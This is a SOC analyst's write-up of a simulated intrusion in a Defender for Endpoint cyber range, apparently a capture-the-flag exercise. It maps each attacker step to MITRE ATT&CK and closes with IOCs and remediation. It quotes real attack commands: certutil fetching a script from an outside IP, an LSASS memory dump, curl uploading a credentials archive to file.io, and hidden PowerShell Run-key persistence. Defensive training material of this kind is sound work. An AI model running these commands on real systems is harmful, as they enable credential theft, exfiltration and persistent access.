# Background

### Key Findings (Executive)

- **Staging directory** used for tools + data: `C:\Windows\Logs\CBS` (made hidden/system via `attrib.exe +h +s`)
- **Ingress tool transfer**: PowerShell script retrieved via **certutil** into CBS:
    - `certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
- **Data staging from network share**: `xcopy.exe` used to recursively copy share folders into CBS (notably `IT-Admin`)
- **Compression**: `tar.exe -czf` used to create archives (including `credentials.tar.gz` from `it-admin`)
- **Credential access**:
    - Renamed credential dumping tool identified as `pd.exe`
    - LSASS memory dump created: `C:\Windows\Logs\CBS\lsass.dmp`
- **Exfiltration**: `curl.exe` used form upload to **file.io** (no-auth, ephemeral-style file sharing)
- **Persistence**: Run key set to execute beacon disguised as `svchost.ps1`
    - Registry value name: `FileShareSync`
    - Value data: `powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1`
- **Anti-forensics**: PowerShell history file deleted: `ConsoleHost_history.txt`

### **Impact Assessment**

The attacker successfully accessed administrative credentials, dumped LSASS memory, and exfiltrated credential data to an external cloud service. If this were a production environment, the incident would represent a **high severity breach** with potential for full domain compromise, unauthorized data disclosure, and persistent attacker access.

This report documents the investigation of a simulated intrusion within the Azuki enterprise environment, attributed to a threat actor tracked as **Jade Spider**. The activity mirrors advanced, stealth focused tradecraft commonly observed in real world intrusions, including PowerShell abuse, registry based persistence, credential staging, lateral movement and cloud based exfiltration.

**Objective**

The goal of this investigation was to:

- Identify compromised systems
- Reconstruct the attacker’s timeline
- Detect persistence and lateral movement mechanisms
- Identify staged and exfiltrated data
- Map observed behaviors to MITRE ATT&CK techniques
- Provide actionable remediation and mitigation guidance

**Scope**

This investigation was conducted using **Microsoft Defender for Endpoint (MDE)** and **Advanced Hunting (KQL)** across the following assets:

- `azuki-fileserver01`
- Related user and service accounts involved in the attack chain

# Analysis

### Scenario Summary

**Environment:** Microsoft Defender for Endpoint (MDE) cyber range simulating an enterprise file server

**Primary Host:** `azuki-fileserver01`

**Threat Actor (Simulated):** “Jade Spider” (APT style tradecraft)

**Outcome:** Tool ingress → staging in `C:\Windows\Logs\CBS\` → data collection + archiving → exfiltration to `file.io` → persistence via Run key → anti-forensics (PowerShell history deletion)

---

### Mission & Working Hypothesis

**Mission**

Identify the attacker’s activity chain on `azuki-fileserver01`, document evidence per flag, and map behaviors to MITRE ATT&CK to support detection engineering.

**Hypothesis (validated)**

Attacker leveraged LOLBins (PowerShell, certutil, curl, attrib, xcopy, tar), staged data/tools in an OS-looking directory (`CBS`), dumped LSASS memory using a renamed tool, established persistence using a benign-looking Run key name, exfiltrated to an anonymous cloud file-sharing service, and attempted to reduce forensic visibility by deleting PowerShell history.

---

### Methodology

- Investigated using **Microsoft Defender for Endpoint Advanced Hunting**
- Iteratively ran **KQL** per flag objective:
    - `DeviceProcessEvents` (process + command line)
    - `DeviceFileEvents` (file create/delete)
    - `DeviceRegistryEvents` (persistence)
- Narrowed searches by:
    - Device: `azuki-fileserver01`
    - Time window: **2025-11-18 → 2025-11-25**
    - Known staging path: `C:\Windows\Logs\CBS\`
- Recorded “full command line” evidence to match flag format requirements.

---

### “Protected OS components” (what that hint meant)

When the flag said the attacker made the directory “blend in with protected OS components,” it meant they **chose a path that looks Windows-internal** (like `C:\Windows\Logs\CBS`) and **applied attributes** so it behaves/look like system-owned content. This reduces casual discovery and can reduce attention during triage.

---

## 🚩Flag 1 – Initial Access: Return Connection Source

### **Findings**

Following the original compromise of the Azuki environment, the attacker did not immediately continue operations. Instead, they demonstrated **dwell time**, returning later from a **different external IP address**, a common tactic used by sophisticated threat actors to evade detection and disrupt correlation.

By querying **logon events** on the original beachhead host and comparing results against the IP used during **CTF 1**, I identified a new source address associated with the attacker’s return connection.

- **Return Connection Source IP:**
    
    **`159.26.106.98`**
    

This infrastructure rotation confirms intentional operational security (OPSEC) and supports the hypothesis of a controlled, staged intrusion rather than opportunistic access.

### **MITRE ATT&CK Mapping**

- **Tactic:** Initial Access
- **Technique:** **TA0001 – Initial Access**
- **Description:** The attacker re-established access using alternate infrastructure after a dwell period.

---

## 🚩 Flag 2 – Lateral Movement: Compromised Device

### **Findings**

After regaining access, the attacker initiated lateral movement from the initial beachhead. I searched **`DeviceProcessEvents`** for executions of **`mstsc.exe`**, indicating Remote Desktop usage.

The command-line arguments revealed a target IP address. Correlating this IP with **`DeviceLogonEvents`** across all logon types confirmed the destination system as a high-value file server:

- **Compromised Device:**
    
    **`azuki-fileserver01`**
    

File servers are common lateral movement targets due to their centralized data storage and elevated access permissions, making this a deliberate and strategic choice by the attacker.

### **MITRE ATT&CK Mapping**

- **Tactic:** Lateral Movement
- **Technique:** **TA0008 – Lateral Movement**
- **Description:** The attacker used RDP to pivot from the initial access host to a sensitive file server.

---

## 🚩 Flag 3 – Lateral Movement: Compromised Account

### **Findings**

To determine the scope of unauthorized access, I analyzed **`DeviceLogonEvents`** on `azuki-fileserver01`. This revealed successful authentication using an administrative account designed for file management operations.

- **Compromised Account:**
    
    **`fileadmin`**
    

The account name strongly suggests elevated permissions over shared storage resources, significantly increasing the attacker’s ability to conduct discovery, collection, and exfiltration activities.

### **MITRE ATT&CK Mapping**

- **Tactic:** Lateral Movement
- **Technique:** **T1078 – Valid Accounts**
- **Description:** The attacker leveraged legitimate administrative credentials to access a critical system.

---

## 🚩 Flag 4 – Discovery: Local Share Enumeration

### **Findings**

Once established on the file server, the attacker began enumerating available resources. Searching **`DeviceProcessEvents`** on `azuki-fileserver01` during the discovery phase revealed execution of a native Windows utility used to list local SMB shares.

The observed command was:

```
net.exe share

```

This indicates the attacker was identifying locally available shares to determine where sensitive data was stored.

### **MITRE ATT&CK Mapping**

- **Tactic:** Discovery
- **Technique:** **T1135 – Network Share Discovery**
- **Description:** Local network shares were enumerated to identify accessible data repositories.

---

## 🚩 Flag 5 – Discovery: Remote Share Enumeration

### **Findings**

The attacker expanded discovery beyond the local system by enumerating **remote network shares** using a UNC path. This step is commonly used to map additional file servers or shared resources across the environment.

The full command executed was:

```
net.exe view \\10.1.0.188

```

This confirms the attacker was actively surveying the broader network to identify additional targets for access or data collection.

### **MITRE ATT&CK Mapping**

- **Tactic:** Discovery
- **Technique:** **T1135 – Network Share Discovery**
- **Description:** Remote share enumeration was used to assess accessible systems across the network.

---

## 🚩 Flag 6 – Discovery: Privilege Enumeration

### **Findings**

To understand their level of access and determine whether further privilege escalation was required, the attacker executed a native Windows command that returns detailed security context information.

The full command observed was:

```
whoami /all

```

This provided the attacker with:

- User identity
- Group memberships
- Assigned privileges and security identifiers (SIDs)

This step confirms deliberate privilege assessment and situational awareness early in the post-compromise phase.

### **MITRE ATT&CK Mapping**

- **Tactic:** Discovery
- **Technique:** **T1033 – System Owner/User Discovery**
- **Description:** The attacker enumerated their security context to assess permissions and capabilities.

## 🚩 Flag 7 – Discovery: File Server Reconnaissance

### **Findings**

After enumerating network shares, the attacker transitioned into **file-level reconnaissance** on `azuki-fileserver01`. This activity focused on identifying directories likely to contain sensitive administrative and business data.

Process execution telemetry showed **native Windows utilities** being used to traverse directories associated with IT administration and internal operations. This behavior aligns with a manual, hands-on-keyboard discovery phase rather than automated malware execution.

### **MITRE ATT&CK Mapping**

- **Tactic:** Discovery
- **Technique:** **T1083 – File and Directory Discovery**

---

## 🚩 Flag 8 – Collection: Administrative Data Staging

### **Findings**

The attacker staged sensitive data by copying files from shared locations into a **local staging directory** under:

```
C:\Windows\Logs\CBS\

```

This directory was intentionally chosen because it:

- Appears legitimate
- Is rarely reviewed by users
- Blends into normal Windows operational noise

The use of `xcopy.exe` confirms deliberate, manual data handling.

### **MITRE ATT&CK Mapping**

- **Tactic:** Collection
- **Technique:** **T1005 – Data from Local System**

---

## 🚩 Flag 9 – Collection: Credential File Discovery

### **Findings**

A credential-containing spreadsheet was created in the staging directory:

```
IT-Admin-Passwords.csv

```

This file naming convention is **self-explanatory**, a hallmark of hands-on attackers prioritizing speed over stealth during internal operations.

This event represents **explicit credential harvesting**, not inference.

### **MITRE ATT&CK Mapping**

- **Tactic:** Credential Access
- **Technique:** **T1552 – Unsecured Credentials**

---

## 🚩 Flag 10 – Collection: Credential Staging Archive

### **Findings**

After collecting credential material, the attacker compressed staged data using a native archival utility. This reduced file size and prepared the data for exfiltration.

The archive was written to the same trusted staging directory to avoid suspicion.

### **MITRE ATT&CK Mapping**

- **Tactic:** Collection
- **Technique:** **T1560 – Archive Collected Data**

---

## 🚩 Flag 11 – Collection: Credential File Creation (Corrected)

### **Findings**

The **credential file created in the staging directory** was:

```
IT-Admin-Passwords.csv

```

This file—not the compressed archive—represents the **primary credential artifact** created during collection. The archive observed later was used strictly for transport and exfiltration.

### **MITRE ATT&CK Mapping**

- **Tactic:** Credential Access
- **Techniques:**
    - **T1552 – Unsecured Credentials**
    - **T1555 – Credentials from Password Stores**

---

## 🚩 Flag 12 – Credential Access: LSASS Memory Dump

### **Findings**

The attacker escalated credential access by dumping **LSASS process memory**, targeting live authentication material.

The following command was executed:

```
pd.exe --accept-eula -ma 876 C:\Windows\Logs\CBS\lsass.dmp

```

This confirms **direct memory scraping**, bypassing disk-based credential stores.

### **MITRE ATT&CK Mapping**

- **Tactic:** Credential Access
- **Technique:** **T1003.001 – LSASS Memory**

---

## 🚩 Flag 13 – Persistence: Registry Autorun

### **Findings**

Persistence was established via a **Registry Run key**, designed to appear legitimate:

- **Value Name:** `FileShareSync`
- **Payload:** Hidden PowerShell execution of a masqueraded script

This ensured execution on every system startup.

### **MITRE ATT&CK Mapping**

- **Tactic:** Persistence
- **Technique:** **T1547.001 – Registry Run Keys**

---

## 🚩 Flag 14 – Persistence: Beacon Masquerading

### **Findings**

The persistent payload was disguised as a legitimate Windows component:

```
svchost.ps1

```

This filename was intentionally chosen to blend into standard process listings and evade casual inspection.

### **MITRE ATT&CK Mapping**

- **Tactic:** Defense Evasion / Persistence
- **Technique:** **T1036.005 – Masquerading**

---

## 🚩 Flag 15 – Exfiltration: Data Upload Command

### **Findings**

The attacker exfiltrated staged data using a **native HTTP client**, avoiding custom malware.

The full command used was:

```
curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io

```

The use of multipart form upload aligns with attacker tradecraft designed to mimic legitimate web traffic.

### **MITRE ATT&CK Mapping**

- **Tactic:** Exfiltration
- **Technique:** **T1567 – Exfiltration Over Web Service**

---

## 🚩 Flag 16 – Exfiltration: Tool Transfer

### **Findings**

`curl.exe` was used as a **dual-purpose utility**:

- Uploading stolen data
- Communicating with external infrastructure

This confirms use of **living-off-the-land tools** to reduce detection.

### **MITRE ATT&CK Mapping**

- **Tactic:** Command and Control / Exfiltration
- **Technique:** **T1105 – Ingress Tool Transfer**

---

## 🚩 Flag 17 – Exfiltration: Cloud Service Used

### **Findings**

The destination service used for data exfiltration was:

```
file.io

```

This service provides **ephemeral, anonymous file hosting**, making it highly attractive to attackers seeking minimal forensic residue.

### **MITRE ATT&CK Mapping**

- **Tactic:** Exfiltration
- **Technique:** **T1567.002 – Exfiltration to Cloud Storage**

---

## 🚩 Flag 18 – Persistence: Registry Value Name

### **Findings**

The registry value used to establish persistence was:

```
FileShareSync

```

The naming convention mimics legitimate synchronization services commonly found on file servers.

### **MITRE ATT&CK Mapping**

- **Tactic:** Persistence
- **Technique:** **T1547.001 – Registry Run Keys**

---

## 🚩 Flag 19 – Persistence: Beacon Filename

### **Findings**

The persistent PowerShell beacon executed on startup was:

```
svchost.ps1

```

This filename further demonstrates **process and file masquerading** to evade detection.

### **MITRE ATT&CK Mapping**

- **Tactic:** Defense Evasion
- **Technique:** **T1036.005 – Masquerading**

---

## 🚩 Flag 20 – Anti-Forensics: PowerShell History Deletion

### **Findings**

The attacker deleted PowerShell command history to conceal interactive activity.

The targeted file was:

```
ConsoleHost_history.txt

```

This action confirms **intentional anti-forensic behavior** following successful exfiltration.

### **MITRE ATT&CK Mapping**

- **Tactic:** Defense Evasion
- **Technique:** **T1070.003 – Clear Command History**

---

### **Detection Opportunities Identified**

- File creation under `C:\Windows\Logs\CBS\` by non-system processes
- `curl.exe` performing outbound multipart form uploads
- Registry Run keys executing PowerShell with hidden window flags
- Creation of LSASS dump files outside of approved tooling
- Deletion of `ConsoleHost_history.txt`

## Attack Timeline (Azuki)

All key activity clustered on **Nov 21, 2025** on `azuki-fileserver01`:

1. **Hide staging directory**
    
    `attrib.exe +h +s C:\Windows\Logs\CBS`
    
2. **Ingress: download PowerShell payload into CBS**
    
    `certutil.exe … ex.ps1 → C:\Windows\Logs\CBS\ex.ps1`
    
3. **Stage data from network shares**
    
    `xcopy.exe C:\FileShares\IT-Admin → C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
    
4. **Credential file created / identified**
    
    `IT-Admin-Passwords.csv` created under CBS staging
    
5. **Compress staged data**
    
    `tar.exe -czf …\credentials.tar.gz -C …\it-admin .`
    
6. **Credential access via LSASS dump**
    
    `pd.exe … -ma 876 …\lsass.dmp`
    
7. **Exfiltration to cloud service**
    
    `curl.exe -F file=@…\credentials.tar.gz https://file.io`
    
8. **Persistence established via Run key**
    
    Value name `FileShareSync` → executes `svchost.ps1`
    
9. **Anti-forensics**
    
    Deleted `ConsoleHost_history.txt`
    

---

## Indicators of Compromise

### Hosts

- `azuki-fileserver01`

### Staging / Tool Paths

- `C:\Windows\Logs\CBS\`
- `C:\Windows\Logs\CBS\ex.ps1`
- `C:\Windows\Logs\CBS\lsass.dmp`
- `C:\Windows\Logs\CBS\credentials.tar.gz`
- `C:\Windows\System32\svchost.ps1` (masqueraded beacon name)

### Suspicious Files

- `pd.exe` (renamed dumping tool)
- `IT-Admin-Passwords.csv`
- `ConsoleHost_history.txt` (deleted)

### Network / External Destinations

- `http://78.141.196.6:7331/ex.ps1`
- `https://file.io` (exfil)

---

## MITRE ATT&CK Mapping (Observed)

- **T1016** – System Network Configuration Discovery
- **T1564.001** – Hide Artifacts: Hidden Files and Directories
- **T1105** – Ingress Tool Transfer (certutil download)
- **T1074.001** – Data Staged: Local Data Staging (CBS directory)
- **T1119** – Automated Collection (xcopy staging from shares)
- **T1560.001** – Archive Collected Data via Utility (tar)
- **T1036 / T1036.005** – Masquerading (svchost.ps1 / renamed tool)
- **T1003.001** – OS Credential Dumping: LSASS Memory
- **T1567.002** – Exfiltration to Cloud Storage (file.io)
- **T1547.001** – Registry Run Keys / Startup Folder (FileShareSync)
- **T1070.003** – Clear Command History (ConsoleHost_history.txt)

# Recommendations

### Immediate Remediation

- Remove malicious registry persistence (`FileShareSync`)
- Delete staged scripts (`svchost.ps1`) and archives
- Rotate credentials for affected users and service accounts
- Review PowerShell execution policies

### Detection & Hardening

- Alert on:
    - `curl.exe` and PowerShell performing outbound HTTP uploads
    - Registry modifications to `Run` keys
    - PowerShell history file deletion
- Restrict or monitor LOLBins:
    - `powershell.exe`
    - `curl.exe`
    - `reg.exe`

# Implementation

### Action Items

| Priority | Task | Owner |
| --- | --- | --- |
| High | Remove persistence artifacts | Endpoint Team |
| High | Credential rotation | IAM Team |
| Medium | Add KQL detections | SOC |
| Medium | PowerShell logging enforcement | SecOps |

### Monitoring Improvements

- Enable enhanced PowerShell logging
- Add detection rules for cloud-based anonymous exfil services
- Correlate file staging → upload patterns

### Lessons Learned

This investigation reinforced how attackers rely heavily on native tools rather than malware. The absence of custom binaries meant detection depended on **behavioral correlation**, not signatures. Monitoring LOLBins in context, especially when combined with suspicious paths and timing proved critical.

**Analyst:** Lamere Carter

**Role:** SOC Analyst (Simulation / Training)

**Tools:** Microsoft Defender for Endpoint, KQL

**Frameworks:** MITRE ATT&CK

**Date:** *(12/12/2025)*
